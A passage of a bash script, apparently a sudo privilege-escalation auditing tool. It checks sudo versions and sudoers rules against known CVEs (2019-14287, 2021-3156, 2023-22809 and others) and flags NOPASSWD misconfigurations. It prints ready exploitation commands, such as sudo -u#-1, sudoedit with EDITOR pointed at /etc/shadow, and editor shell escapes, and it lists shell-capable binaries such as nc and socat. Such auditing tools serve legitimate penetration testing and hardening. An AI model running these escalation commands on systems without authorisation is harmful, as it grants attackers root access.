\"${BOLD}${YELLOW}[+] This can occur when there is no rule with NOPASSWD or when root has explicitly configured sudo to ask for a password to list rules.${RESET}\\n\"\n      exit\n    fi\n  fi\n\n  if [ \"$report\" ]; then\n    echo -e \"${BOLD}${YELLOW}[+] Report saved: ${RESET} $vpath/$report\"\n  fi\n\n  if [ \"$exports\" ]; then\n    echo -e \"${BOLD}${YELLOW}[+] Sudo rules exported: ${RESET} $vpath/sudo_export.txt\"\n  fi\n\n  checksudoersize\n\n  checksudoerstimestamp \n\n  checkcustomsecurepath\n\n  echo -e \"\\n\"\n\n} # intro\n\n#------------------------------------------------------\n\n# Helper function to check sudo permissions\ncheck_sudo_permissions() {\n  if [ -z \"$sudoperms\" ]; then\n    sudoperms=$(sudo -S -l -k 2>/dev/null)\n  fi\n}\n\n# Helper function to print sudo pwnage\nprint_sudo_pwnage() {\n  sudopwnage=$(echo \"$sudoperms\" | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w \"$binarylist\" 2>/dev/null)\n  if [ \"$sudopwnage\" ]; then\n    echo -e \"${BOLD}${GREEN}[+] Possible sudo pwnage!${RESET}\\n$sudopwnage\"\n    echo -e \"\\n\"\n  fi\n}\n\n# Helper function to print sudo users\nprint_sudo_users() {\n  sudo_user=$(getent group sudo | cut -d\":\" -f 4)\n  if [ \"$sudo_user\" ]; then\n    echo -e \"${BOLD}${GREEN}[+] All users found in sudo group: ${RESET}\\n$sudo_user\"\n    echo -e \"\\n\"\n  fi\n}\n\ncheckinitial() {\n  #echo -e \"${BOLD}${YELLOW}================== Initial check - Quick overview ========================= ${RESET} \\n\"\n  echo -e \"${BOLD}${YELLOW}[1/21] ====== Initial check - Quick overview ====== ${RESET} \\n\"\n\n  # useful binaries (thanks to https://gtfobins.github.io/)\n  binarylist='cp\\|nmap\\|perl\\|awk\\|find\\|bash\\|sh\\|man\\|more\\|less\\|vi\\|emacs\\|vim\\|nc\\|netcat\\|python\\|ruby\\|lua\\|irb\\|tar\\|zip\\|gdb\\|pico\\|scp\\|git\\|rvim\\|script\\|ash\\|csh\\|curl\\|dash\\|ed\\|env\\|expect\\|ftp\\|sftp\\|node\\|php\\|rpm\\|rpmquery\\|socat\\|strace\\|taskset\\|tclsh\\|telnet\\|tftp\\|wget\\|wish\\|zsh\\|ssh|grep\\|csplit\\|csvtool'\n\n  ##### sudo version - check to see if there are any known vulnerabilities with this - CVE\n  if [ \"$sudover\" ]; then\n    echo -e \"${BOLD}${GREEN}[+] Sudo version:${RESET}\\n$sudover\"\n    echo -e \"\\n\"\n  fi\n\n  ###check the timestamp\n  timestamp=$(sudo -l | grep -i timestamp_timeout | sed 's/,/\\n/g' | grep -i timestamp_timeout | cut -d \"=\" -f 2)\n  echo -e \"${BOLD}${GREEN}[+] Timestamp:${RESET}\"\n  echo -e \"Timestamp is the amount of time in minutes between instances of sudo before it will re-prompt for a password.\"\n  echo -e \"${timestamp:-5} mins\"\n  echo -e \"\\n\"\n\n  # Check if sudo is possible without supplying a password\n  check_sudo_permissions\n  #sudoperms=$(sudo -S -l -k 2>/dev/null)\n\n  if [ \"$sudoperms\" ]; then\n    echo -e \"${BOLD}${GREEN}[+] SUDO possible without a password!${RESET}\\n\\n$sudoperms\"\n    echo -e \"\\n\"\n  fi\n\n  # Check if sudo is possible with a password supplied\n  if [ \"$sudopass\" ]; then\n    if [ -z \"$sudoperms\" ]; then\n      sudoauth=$(sudo -S -l -k 2>/dev/null)\n      if [ \"$sudoauth\" ]; then\n        echo -e \"${BOLD}${GREEN}[+] SUDO possible with a password supplied!${RESET}\\n\\n$sudoauth\"\n        echo -e \"\\n\"\n      fi\n    fi\n  fi\n\n  # Known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma-separated values) - authenticated\n  print_sudo_pwnage\n\n  #   sudopwnage=$(echo \"$sudoperms\" | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w \"$binarylist\" 2>/dev/null)\n  #   if [ \"$sudopwnage\" ]; then\n  #     echo -e \"${BOLD}${GREEN}[+] Possible sudo pwnage!${RESET}\\n$sudopwnage\"\n  #     echo -e \"\\n\"\n  #   fi\n\n  # Who has sudoed in the past\n  whohasbeensudo=$(find /home -name .sudo_as_admin_successful 2>/dev/null)\n  if [ \"$whohasbeensudo\" ]; then\n    echo -e \"[-] Accounts that have recently used sudo:\\n$whohasbeensudo\"\n    echo -e \"\\n\"\n  fi\n\n  # Sudo users\n  print_sudo_users\n\n  #   sudo_user=$(getent group sudo | cut -d\":\" -f 4)\n  #   if [ \"$sudo_user\" ]; then\n  #     echo -e \"${BOLD}${GREEN}[+] All users found in sudo group: ${RESET}\\n$sudo_user\"\n  #     echo -e \"\\n\"\n  #   fi\n\n  #   # Check if SELinux is enabled\n  #     sestatus=`sestatus 2>/dev/null`\n  #     if [ \"$sestatus\" ]; then\n  #         echo -e \"[-] SELinux seems to be present: $sestatus, can execute /CVE/CVE-2017-1000367-2.c if vulnerable (Check CVEs).\"\n  #         echo -e \"\\n\"\n  #     fi\n\n  # Exporting sudo rules\n  if [ \"$exports\" ]; then\n    echo \"$cmd\" >\"$vpath/sudo_export.txt\" 2>/dev/null\n    echo -e \"${BOLD}${GREEN}[+] Sudo rules exported!${RESET} \\n$vpath/sudo_export.txt \"\n    echo -e \"\\n\"\n    local cmddt=$(sudo -ll)\n    echo \"$cmddt\" >\"$vpath/sudo_export_list.txt\" 2>/dev/null\n    echo -e \"${BOLD}${GREEN}[+] Detailed Sudo rules exported!${RESET} \\n$vpath/sudo_export_list.txt \"\n    echo -e \"\\n\"\n  fi\n\n  # pull out vital sudoers info\n  # sudoers=$(grep -v -e '^$' /etc/sudoers 2>/dev/null | grep -v \"#\" 2>/dev/null)\n  # # Export sudoers file to export location\n  # if [ \"$exports\" ] && [ \"$sudoers\" ]; then\n  #     echo -e \"${BOLD}${GREEN}[+] Sudoers configuration exported:${RESET}\\n$sudoers\"\n  #     echo -e \"\\n\"\n  #     echo \"$sudoers\" > \"$vpath/sudoers_export.txt\" 2>/dev/null\n  # fi\n\n  if [ -r \"/etc/sudoers\" ]; then\n    echo -e \"${BOLD}${RED}[+] The file /etc/sudoers is readable by current user.${RESET}\"\n    #export sudoers file to export location\n    if [ \"$exports\" ] && [ \"$sudoers\" ]; then\n      cp /etc/sudoers $vpath/sudoers_export.txt 2>/dev/null\n    else\n      :\n    fi\n  fi\n\n} # checkinitial\n\n#------------------------------------------------------\n\n# Function to print vulnerability information\ncheck_cve_version() {\n\n  echo -e \"${BOLD}${GREEN}[+] Sudo version is vulnerable to the following CVEs:${RESET}\"\n  echo -e \"${BOLD}${GREEN}[+] Despite the version being vulnerable to a CVE or several,${RESET}\"\n  echo -e \"${BOLD}${GREEN}[+] some requirements might be needed for exploitation.\\n${RESET}\"\n\n  sver_tmp=$(sudo -V 2>/dev/null | grep \"Sudo version\" 2>/dev/null | cut -d\" \" -f 3 2>/dev/null)\n  version=$(echo $sver_tmp | tr -d ' ' | sed 's/P/p/g')\n\n  # Display CVEs vulnerable based on version\n  cat $PWD/CVE/cve.sudover.vuln.txt | grep \"$version\" | cut -d\"+\" -f 1,2 | awk '{print $0,\"\\n\"}'\n\n  cve_vuln=$(cat $PWD/CVE/cve.sudover.vuln.txt | grep \"$version\" | cut -d\"+\" -f 1)\n\n  if [ \"$cve_vuln\" ]; then\n    echo -e \"\\n[+] Please find the following exploit(s) for some of the detected CVEs\\n\"\n    while read -r line; do\n      cvepath=$(ls -al $PWD/CVE/ | grep \"$line\" | tr -s \" \" | cut -d \" \" -f 9)\n      if [ \"$cvepath\" ]; then\n        echo -e \"  [*] $PWD/CVE/${BOLD}${RED}$cvepath${RESET} \\n\"\n      fi\n    done <<<\"$cve_vuln\"\n  fi\n}\n\n# function check_and_print_cve() {\n#   local cve_cond=\"$1\"\n#   local cve_number=\"$2\"\n#   local sudo_intversion=\"$3\"\n#   local sudo_version=\"$3\"\n#   local description=\"$4\"\n#   local exploit_file=\"$5\"\n\n#   if [ \"$cnver\" -lt \"$sudo_intversion\" ]; then\n#       cve_vulnerable=$(eval \"echo \\\"\\$cmd\\\" 2>/dev/null | $cve_cond\")\n#       #echo -e \"$cve_cond\"\n#     if [ \"$cve_vulnerable\" ]; then\n#       echo -e \"${BOLD}${GREEN}[+] Checking for the vulnerability $cve_number: ${RESET}\"\n#       echo -e \"${BOLD}${RED}[-] Vulnerable to $cve_number${RESET}\"\n#       echo -e \"[-] Current Sudo version: $sudover | Vulnerable version: <=$sudo_version\"\n#       echo -e \"[-] Description: $description\"\n#       echo -e \"[-] Exploit: /CVE/$exploit_file\"\n#       echo -e \"\\n\"\n#     fi\n#   fi\n# }\n\ncheckcve() {\n\n  # Check for sudo version vulnerability based on CVEs\n  if [ \"$sudocve\" ]; then\n    echo -e \"${BOLD}${YELLOW}[2/21] ====== Checking for disclosed vulnerabilities (CVEs) - version based ====== ${RESET} \\n\"\n    check_cve_version\n    echo -e \"${BOLD}${BLUE}[@] Check [2/21] Completed!${RESET} \\n\"\n\n    # ---------------------------------------------\n\n    echo -e \"${BOLD}${YELLOW}[3/21] ====== Checking for disclosed vulnerabilities (CVE) ====== ${RESET} \\n\"\n    echo -e \"${BOLD}${GREEN}[+] The prerequisites for the below CVEs have been checked (not all CVEs checked - refer to readme):${RESET}\"\n    echo -e \"${BOLD}${RED}[+] Highly probable that sudo is VULNERABLE to the below CVEs:${RESET} \\n\"\n\n    # Check for specific CVE vulnerabilities as well as their requirements\n\n    ##### CVE-2015-5602\n    ##### The bug was found in sudoedit, which does not check the full path if a wildcard is used twice (e.g. /home/*/*/esc.txt),\n    #####  this allows a malicious user to replace the esc.txt real file with a symbolic link to a different location (e.g. /etc/shadow).\n\n    # check_and_print_cve 'grep \"(root) NOPASSWD: sudoedit\" | grep -F $\"/*/*/\"' \"CVE-2015-5602\" 1008015 \"The bug was found in sudoedit, which does not check the full path if a wildcard is used twice.\" \"CVE-2015-5602.sh\"\n\n    if [ \"$cnver\" -lt \"1008015\" ]; then\n      sudodblwildcard=$(echo \"$cmd\" 2>/dev/null | grep \"(root) NOPASSWD: sudoedit\" | grep -F $\"/*/*/\")\n      if [ \"$sudodblwildcard\" ]; then\n        echo -e \"${BOLD}${RED}[-] Vulnerable to CVE-2015-5602${RESET}\"\n        echo -e \"${BOLD}${GREEN}[+] Sudoedit with double wildcard was detected. The bug was found in sudoedit, which does not check the full path if a wildcard is used twice. (CVE-2015-5602): ${RESET}\"\n        echo -e \"$sudodblwildcard\"\n        echo -e \"[-] current $sudover | vuln version: <=1.8.14\"\n        echo -e \"[*] Exploit: /CVE/CVE-2015-5602.sh\"\n        echo -e \"\\n\"\n      #  echo -e \"[-] run the command: sudo ./CVE-2015-5602.sh then su [RANDOM PASSWORD GENERATED]\\n\"\n      fi\n    fi # check version\n\n    ##### CVE-2019-14287\n    if [ \"$cnver\" -lt \"1008027\" ]; then\n      sudorunas=$(echo \"$cmd\" 2>/dev/null | grep \"(ALL, \\!root)\")\n      if [ \"$sudorunas\" ]; then\n        cmdi=$(echo \"$cmd\" 2>/dev/null | grep \"(ALL, \\!root)\" | sed 's/NOPASSWD//g' | sed 's/://g' | cut -d \")\" -f 2)\n        echo -e \"${BOLD}${RED}[-] Vulnerable to CVE-2019-14287${RESET}\"\n        echo -e \"${BOLD}${GREEN}[+] The vulnerability allows users with sudo permissions to execute arbitrary commands as root. (CVE-2019-14287): ${RESET}\"\n        echo -e \"[-] current $sudover | vuln version: <=1.8.27\"\n        echo -e \"[-] Example : sudo -u#-1 /usr/bin/id\"\n        echo -e \"[-] Run command : sudo -u#-1 <cmd>\"\n        echo -e \"[-] where <cmd> is one of the following:\"\n        echo -e \"$cmdi\"\n        echo -e \"[*] Exploit: /CVE/CVE-2019-14287.txt\"\n        echo -e \"\\n\"\n      fi\n    fi\n\n    ##### CVE-2019-18634\n    if [ \"$cnver\" -lt \"1008026\" ] && [ \"$cnver\" -gt \"1007001\" ]; then\n      sudopwfeedback=$(echo \"$cmd\" 2>/dev/null | grep \" pwfeedback\")\n      if [ \"$sudopwfeedback\" ]; then\n        echo -e \"${BOLD}${RED}[-] Vulnerable to CVE-2019-18634${RESET}\"\n        echo -e \"${BOLD}${GREEN}[+] The vulnerability is caused by a heap-based buffer overflow condition in the sudo command. (CVE-2019-18634): ${RESET}\"\n        echo -e \"[-] current $sudover | vuln version: 1.7.1 to 1.8.25p1 inclusive\"\n        # echo -e \"[-] Run command : perl -e 'print((\"A\" x 100 . \"\\x{00}\") x 50)' | sudo -S id\"\n        echo -e \"[-] Run command : perl -e 'print((\\\"A\\\" x 100 . \\\"\\\\x{00}\\\") x 50)' | sudo -S id\"\n        echo -e \"[-] if you have a segmentation fault then sudo is vulnerable\"\n        echo -e \"[*] Notes: /exploits/pwfeedback.txt\"\n        echo -e \"[*] Exploit: /CVE/CVE-2019-16634-pwfeedback/CVE-2019-18634.sh\"\n        echo -e \"\\n\"\n      fi\n    fi\n\n    #### CVE-2021-23240\n    sudoedit_selinux=$(cat $PWD/CVE/cve.sudover.vuln.txt | grep \"$(echo $sver)\" | grep \"CVE-2021-23240\" | cut -d\"+\" -f 1)\n    if [ \"$sudoedit_selinux\" ]; then\n      #check_psymlinks=$(cat /proc/sys/fs/protected_symlinks | grep 0)\n      #if [ \"$check_psymlinks\" ]; then\n        echo -e \"${BOLD}${RED}[-] Vulnerable to CVE-2021-23240${RESET}\"\n        echo -e \"${BOLD}${GREEN}[+] The vulnerability is caused by a heap-based buffer overflow condition in the sudo command. (CVE-2021-23240): ${RESET}\"\n        echo -e \"[-] The version of sudo is vulnerable and symlinks is not protected (set to 0)\"\n        echo -e \"[-] Provided that SELinux is in permissive (not enforcing or disables) mode (Refer to the file  /etc/selinux/) \"\n        echo \"or the invoking user is in an unconfined domain, then only all requirements will be met for exploitation.\"\n        echo \"Permissive mode: SELinux prints warnings instead of enforcing.\"\n        echo -e \"[*] M1 : Run command: sudoedit /path then :e /etc/sudoers or :e /etc/shadow\"\n        echo -e \"[*] M2 : Run command: S1 -> sudoedit /path then :call libcallnr(\"libc.so.6\",\"setuid\",0)\"\n        echo -e \" S2 -> then run ::!bash\"\n        echo -e \"[*] M3 : Notes: /CVE/CVE-2021-23240.txt\"\n        echo -e \"\\n\"\n      #fi\n    fi\n\n    #### CVE-2021-3156\n    sudoescapevschk=$(cat $PWD/CVE/cve.sudover.vuln.txt | grep \"$(echo $sver)\" | grep \"CVE-2021-3156\" | cut -d\"+\" -f 1)\n    if [ \"$sudoescapevschk\" ]; then\n      sudounescapeof=$(echo \"$cmd\" 2>/dev/null | grep -w \"root) NOPASSWD:\\|ALL) NOPASSWD:\" | grep \"sudoedit /\")\n      if [ \"$sudounescapeof\" ]; then\n        sudo_escape1=$(sudoedit -s / 2>&1)\n        sudo_escape=$(echo \"$sudo_escape1\" | grep -w \"sudoedit: /: not a regular file\")\n        #sudo_escape=$(\"sudoedit -s /\")\n        if [ \"$sudo_escape\" ]; then\n          echo -e \"${BOLD}${RED}[-] Vulnerable to CVE-2021-3156${RESET}\"\n          echo -e \"${BOLD}${GREEN}[+] The vulnerability is caused by a heap-based buffer overflow vulnerability in sudo, allowing attackers to gain root-level privileges on Unix-like systems. (CVE-2021-3156): ${RESET}\"\n          echo -e \"[-] current $sudover | vuln version: 1.7.7-1.7.10p9, 1.8.2-1.8.31p2, and 1.9.0-1.9.5p1\"\n          #echo -e \"[*] Run command: sudoedit -s / - If output starts with { sudoedit: } vulnerable else { usage: } not vulnerable \"\n          #echo -e \"Example of output: { sudoedit: /: not a regular file } means it is Vulnerable to CVE-2021-3156\"\n          echo -e \"[*] Notes: CVE/CVE-2021-3156.txt\"\n          echo -e \"[*] Exploit: refer to CVE/CVE-2021-3156/, several exploits are provided and be aware then some of them can pose some risks\"\n          echo -e \"    to be run on production environment and most of them are version specific... read the readme/note.\"\n          echo -e \"\\n\"\n        fi\n      fi\n    fi\n\n    ### CVE-2023-22809\n    sudoeditrockchk=$(cat $PWD/CVE/cve.sudover.vuln.txt | grep \"$(echo $sver)\" | grep \"CVE-2023-22809\" | cut -d\"+\" -f 1)\n    if [ \"$sudoeditrockchk\" ]; then\n\n      #sudoeditrock=$(echo \"$cmd\" 2>/dev/null | grep -i \"(root) NOPASSWD: sudoedit /\")\n      #sudoeditrock=$(echo \"$cmd\" 2>/dev/null | grep -i \"(root) NOPASSWD: sudoedit /\" | sed -e \"s/(root) NOPASSWD: /EDITOR='vi -- \\/etc\\/shadow' /g\" )\n      sudoeditrock=$(echo \"$cmd\" 2>/dev/null | grep -i \"(root) NOPASSWD: sudoedit /\\|(ALL : ALL) NOPASSWD: sudoedit\\|(ALL) NOPASSWD: sudoedit\" | sed -e \"s/(root) NOPASSWD: /EDITOR='vi -- \\/etc\\/shadow' /g\" | sed -e \"s/(ALL : ALL) NOPASSWD: /EDITOR='vi -- \\/etc\\/shadow' /g\" | sed -e \"s/(ALL) NOPASSWD: /EDITOR='vi -- \\/etc\\/shadow' /g\")\n      if [ \"$sudoeditrock\" ]; then\n        #sudo_escape=$(sudoedit -s / | grep \"sudoedit:\")\n        #sudo_escape=$(\"sudoedit -s /\")\n        #if [ \"$sudo_escape\" ]; then\n        echo -e \"${BOLD}${RED}[-] Vulnerable to CVE-2023-22809${RESET}\"\n        echo -e \"${BOLD}${GREEN}[+] The vulnerability allows users to run arbitrary commands by abusing sudoedit as root without authentication. (CVE-2023-22809):${RESET}\"\n        echo -e \"[-] current $sudover | vuln version: 1.8.0 to 1.9.12p1 inclusive\"\n        echo -e \"[*] Run one of the command (No Password Required): \"\n        echo -e \"$sudoeditrock\"\n        echo -e \"[+] Tested editor: vi and vim, the file is /etc/shadow here but can be any file\"\n        echo -e \"[+] The variable EDITOR is used as default but can be also SUDO_EDITOR or VISUAL\"\n        echo -e \"[*] Notes: /CVE/CVE-2023-22809.txt\"\n        #echo -e \"[*] Exploit: \"\n        echo -e \"\\n\"\n      #fi\n      fi\n\n      sudoeditrocknp=$(echo \"$cmd\" 2>/dev/null | grep -i \"(root) sudoedit /\\|(ALL : ALL) sudoedit\\|(ALL) sudoedit\" | sed -e \"s/(root) /EDITOR='vi -- \\/etc\\/shadow' /g\" | sed -e \"s/(ALL : ALL) /EDITOR='vi -- \\/etc\\/shadow' /g\" | sed -e \"s/(ALL) /EDITOR='vi -- \\/etc\\/shadow' /g\")\n      if [ \"$sudoeditrocknp\" ]; then\n        echo -e \"${BOLD}${RED}[-] Vulnerable to CVE-2023-22809${RESET}\"\n        echo -e \"${BOLD}${GREEN}[-] The vulnerability allows users to run arbitrary commands by abusing sudoedit as root ${BLUE}with user authentication (password needed) ${RESET}. (CVE-2023-22809):${RESET}\"\n        echo -e \"[-] current $sudover | vuln version: 1.8.0 to 1.9.12p1 inclusive\"\n        echo -e \"[*] Run one of the command ${BLUE}(User's password required)${RESET}: \"\n        echo -e \"$sudoeditrocknp\"\n        echo -e \"[+] Tested editor: vi and vim, the file is /etc/shadow here but can be any file\"\n        echo -e \"[+] The variable EDITOR is used as default but can be also SUDO_EDITOR or VISUAL\"\n        echo -e \"[*] Notes: /CVE/CVE-2023-22809.txt\"\n        #echo -e \"[*] Exploit: \"\n        echo -e \"\\n\"\n      fi\n\n      #####  Check for absolute path to sudoedit\n      if [ \"$cnver\" -lt \"1008030\" ]; then\n        sudoeditpathcmd=$(echo \"$cmd\" 2>/dev/null | grep -E \"(/bin/|/usr/bin/|/usr/local/bin/)sudoedit\" | cut -d \" \" -f 8)\n        sudoeditpath=$(echo \"$cmd\" 2>/dev/null | grep -Eo \"(/bin/|/usr/bin/|/usr/local/bin/)sudoedit\")\n        if [ \"$sudoeditpath\" ]; then\n          echo -e \"${BOLD}${RED}[-] Vulnerable to sudoedit absolute path vuln${RESET}\"\n          echo -e \"${BOLD}${GREEN}[+] Absolute path to sudoedit was found in the sudoers file: ${RESET}\"\n          echo -e \"[-] Privilege escalation is possible if the sudo version is < 1.8.30\"\n          echo -e \"[*] Run the command sudo $sudoeditpath <file> to invoke a file editor as root\"\n          echo -e \"[*] where <file> is as below:\"\n          echo -e \"$sudoeditpathcmd\"\n          echo -e \"[-] Once you are in the editor, type the following command in command mode to get a shell\"\n          echo -e \"[-] Run command : :set shell=/bin/sh\"\n          echo -e \"[-] :shell\"\n          echo -e \"[*] Then use the appropriate exploit from res/absolute_path-sudoedit.txt for the editor you invoked \\n\"\n        fi\n      fi\n\n    fi\n\n    echo -e \"${BOLD}${BLUE}[@] Check [3/21] Completed!${RESET} \\n\"\n  else\n    echo -e \"${BOLD}${YELLOW}[2/21] ====== Checking for disclosed vulnerabilities (CVEs) - version based ====== ${RESET} \\n\"\n    echo -e \"${BOLD}${RED}Checks related to CVEs were skipped. To include them use the flag -c ${RESET} \\n\"\n\n    echo -e \"${BOLD}${YELLOW}[3/21] ====== Checking for disclosed vulnerabilities (CVE) ====== ${RESET} \\n\"\n    echo -e \"${BOLD}${RED}Checks related to CVEs were skipped. To include them use the flag -c ${RESET} \\n\"\n  fi # cve flag check\n\n} # checkcve\n\n#------------------------------------------------------\nfn_excess_priv() {\n\n  # echo -e \"$cmd\"\n  # Detects variants of the execessive sudo rule \"ALL (ALL) NOPASSWD: ALL\"\n\n  # Variant 1: user (ALL) NOPASSWD: ALL\n  # regex for /etc/sudoers | grep -E '^\\S+\\s+\\(ALL\\)\\s+NOPASSWD:\\s+ALL'\n  exprv1=$(echo \"$cmd\" 2>/dev/null | grep -E '\\(ALL\\)\\s+NOPASSWD:\\s+ALL')\n  if [ \"$exprv1\" ]; then\n    echo -e \"${BOLD}${RED}[+] Excessive Privilege detected [Variant 1]${RESET}\"\n    echo -e \"[-] Variant 1: $who (ALL) NOPASSWD: ALL\"\n    echo -e \"[-] Identified rule: \\n$exprv1\"\n    echo -e \"[-] Impersonate: ${BOLD}${BLUE}Any user [incl root]${RESET}\"\n    echo -e \"[-] Password required: ${BOLD}${BLUE}No${RESET}\"\n    echo -e \"[-] Command/bin: ${BOLD}${BLUE}Any${RESET}\"\n    echo -e \"[*] Notes: notes/execessive_priv.txt \\n\"\n  fi\n\n  # # Variant 3: user (root) NOPASSWD: ALL\n  # regex for /etc/sudoers | grep -E '^\\S+\\s+\\(root\\)\\s+NOPASSWD:\\s+ALL'\n  exprv3=$(echo \"$cmd\" 2>/dev/null | grep -E '\\(root\\)\\s+NOPASSWD:\\s+ALL')\n  if [ \"$exprv3\" ]; then\n    echo -e \"${BOLD}${RED}[+] Excessive Privilege detected [Variant 3]${RESET}\"\n    echo -e \"[-] Variant 3: $who (root) NOPASSWD: ALL\"\n    echo -e \"[-] Identified rule: \\n$exprv3\"\n    echo -e \"[-] Impersonate: ${BOLD}${BLUE}root${RESET}\"\n    echo -e \"[-] Password required: ${BOLD}${BLUE}No${RESET}\"\n    echo -e \"[-] Command/bin: ${BOLD}${BLUE}Any${RESET}\"\n    echo -e \"[*] Notes: notes/execessive_priv.txt \\n\"\n  fi\n\n  # # Variant 4/5: user (ALL) NOPASSWD: /usr/bin/command\n  # regex for /etc/sudoers | grep -E '^\\S+\\s+\\(ALL\\)\\s+NOPASSWD:\\s+/usr/bin/\\w+'\n  exprv45=$(echo \"$cmd\" 2>/dev/null | grep -E '\\(ALL\\)\\s+NOPASSWD:\\s+/*bin*')\n  if [ \"$exprv45\" ]; then\n    echo -e \"${BOLD}${RED}[+] Excessive Privilege detected [Variant 4/5]${RESET}\"\n    echo -e \"[-] Variant 4/5: $who (ALL) NOPASSWD: */s|bin/*\"\n    echo -e \"[-] Identified rule: \\n$exprv45\"\n    echo -e \"[-] Impersonate: ${BOLD}${BLUE}Any user [incl root]${RESET}\"\n    echo -e \"[-] Password required: ${BOLD}${BLUE}No${RESET}\"\n    echo -e \"[-] Command/bin: ${BOLD}${BLUE}Listed one from identified rule${RESET}\"\n    echo -e \"[*] Notes: notes/execessive_priv.txt \\n\"\n  fi\n\n  # # # Variant 5: user (ALL) NOPASSWD: /bin/*\n  # regex for /etc/sudoers | grep -E '^\\S+\\s+\\(ALL\\)\\s+NOPASSWD:\\s+/bin/\\*'\n  #  exprv5=$(echo \"$cmd\" 2>/dev/null | grep -E '\\(ALL\\)\\s+NOPASSWD:\\s+ALL')\n  #  if [ \"$exprv5\" ]; then\n  #   echo -e \"${BOLD}${RED}[+] Excessive Privilege detected [Variant 5]${RESET}\"\n  #   echo -e \"[-] Variant 5: <user> (ALL) NOPASSWD: /bin/*\"\n  #   echo -e \"[-] Identified rule: $exprv5\"\n  #   echo -e \"[*] Notes: notes/execessive_priv.txt\"\n  #  fi\n\n  # # Variant 2: %group (ALL) NOPASSWD: ALL - (ALL : ALL) NOPASSWD: ALL\n  # # regex for /etc/sudoers | grep -E '^%\\w+\\s+\\(ALL\\)\\s+NOPASSWD:\\s+ALL'\n  exprv2=$(echo \"$cmd\" 2>/dev/null | grep -E '\\(ALL \\: ALL\\)\\s+NOPASSWD:\\s+ALL')\n  if [ \"$exprv2\" ]; then\n    echo -e \"${BOLD}${RED}[+] Excessive Privilege detected [Variant 2]${RESET}\"\n    echo -e \"[-] Variant 2: %group (ALL) NOPASSWD: ALL\"\n    echo -e \"[-] Identified rule: \\n$exprv2\"\n    echo -e \"[-] Impersonate: ${BOLD}${BLUE}Any user [incl root] or group${RESET}\"\n    echo -e \"[-] Password required: ${BOLD}${BLUE}No${RESET}\"\n    echo -e \"[-] Command/bin: ${BOLD}${BLUE}Any${RESET}\"\n    echo -e \"[*] Notes: notes/execessive_priv.txt \\n\"\n  fi\n\n  # # Variant 6: %group (ALL) NOPASSWD: /sbin/reboot, /sbin/shutdown\n  # regex for /etc/sudoers | grep -E '^%\\w+\\s+\\(ALL\\)\\s+NOPASSWD:\\s+/*bin/\\*'\n  exprv6=$(echo \"$cmd\" 2>/dev/null | grep -E '\\(ALL \\: ALL\\)\\s+NOPASSWD:\\s+/*bin*')\n  if [ \"$exprv6\" ]; then\n    echo -e \"${BOLD}${RED}[+] Excessive Privilege detected [Variant 6]${RESET}\"\n    echo -e \"[-] Variant 6: %group (ALL) NOPASSWD: */s|bin/*\"\n    echo -e \"[-] Identified rule: \\n$exprv6\"\n    echo -e \"[-] Impersonate: ${BOLD}${BLUE}Any user [incl root] or group${RESET}\"\n    echo -e \"[-] Password required: ${BOLD}${BLUE}No${RESET}\"\n    echo -e \"[-] Command/bin: ${BOLD}${BLUE}Listed one from identified rule${RESET}\"\n    echo -e \"[*] Notes: notes/execessive_priv.txt \\n\"\n  fi\n\n  # # Variant 7: %group (ALL:ALL) NOPASSWD: ALL\n  # echo \"Variant 7: %group (ALL:ALL) NOPASSWD: ALL\"\n  # sudo -l | grep -E '^%\\w+\\s+\\(ALL:\\w+\\)\\s+NOPASSWD:\\s+ALL'\n\n  # # Variant 8: user (root) NOPASSWD: */s|bin/*\n  # regex for /etc/sudoers | grep -E '^\\S+\\s+\\(root\\)\\s+NOPASSWD:\\s+ALL'\n  exprv8=$(echo \"$cmd\" 2>/dev/null | grep -E '\\(root\\)\\s+NOPASSWD:\\s+/*bin/')\n  if [ \"$exprv8\" ]; then\n    echo -e \"${BOLD}${RED}[+] Excessive Privilege detected [Variant 8]${RESET}\"\n    echo -e \"[-] Variant 8: $who (root) NOPASSWD: */|bin/*\"\n    echo -e \"[-] Identified rule: \\n$exprv8\"\n    echo -e \"[-] Impersonate: ${BOLD}${BLUE}root${RESET}\"\n    echo -e \"[-] Password required: ${BOLD}${BLUE}No${RESET}\"\n    echo -e \"[-] Command/bin: ${BOLD}${BLUE}Listed one from identified rule${RESET}\"\n    echo -e \"[*] Notes: notes/execessive_priv.txt \\n\"\n  fi\n\n}\n\nfn_excess_priv_pwd() {\n\n  # Variant 1: user (ALL) ALL\n  # regex for /etc/sudoers | grep -E '^\\S+\\s+\\(ALL\\)\\s+ALL'\n  exprv11=$(echo \"$cmd\" 2>/dev/null | grep -E '\\(ALL\\)\\s+ALL' | grep -v \"PASSWD\")\n  if [ \"$exprv11\" ]; then\n    echo -e \"${BOLD}${RED}[+] Excessive Privilege detected [Variant 1]${RESET}\"\n    echo -e \"[-] Variant 1: $who (ALL)  ALL\"\n    echo -e \"[-] Identified rule: \\n$exprv11\"\n    echo -e \"[-] Impersonate: ${BOLD}${BLUE}Any user${RESET}\"\n    echo -e \"[-] Password required: ${BOLD}${BLUE}Yes (any account)${RESET}\"\n    echo -e \"[-] Command/bin: ${BOLD}${BLUE}Any${RESET}\"\n    echo -e \"[*] Notes: notes/execessive_priv.txt \\n\"\n  fi\n\n  # Variant 4/5: user (ALL)  /usr/bin/command\n  # regex for /etc/sudoers | grep -E '^\\S+\\s+\\(ALL\\)\\s+/usr/bin/\\w+'\n  exprv451=$(echo \"$cmd\" 2>/dev/null | grep -E '\\(ALL\\)\\s+/*bin*' | grep -v \"PASSWD\")\n  if [ \"$exprv451\" ]; then\n    echo -e \"${BOLD}${RED}[+] Excessive Privilege detected [Variant 4/5]${RESET}\"\n    echo -e \"[-] Variant 4/5: $who (ALL)  */s|bin/*\"\n    echo -e \"[-] Identified rule: \\n$exprv451\"\n    echo -e \"[-] Impersonate: ${BOLD}${BLUE}Any user${RESET}\"\n    echo -e \"[-] Password required: ${BOLD}${BLUE}Yes (any account)${RESET}\"\n    echo -e \"[-] Command/bin: ${BOLD}${BLUE}Listed one from identified rule${RESET}\"\n    echo -e \"[*] Notes: notes/execessive_priv.txt \\n\"\n  fi\n\n  # # Variant 2: %group (ALL)  ALL - (ALL : ALL)  ALL\n  # # regex for /etc/sudoers | grep -E '^%\\w+\\s+\\(ALL\\)\\s+ALL'\n  exprv21=$(echo \"$cmd\" 2>/dev/null | grep -E '\\(ALL \\: ALL\\)\\s+ALL' | grep -v \"PASSWD\")\n  if 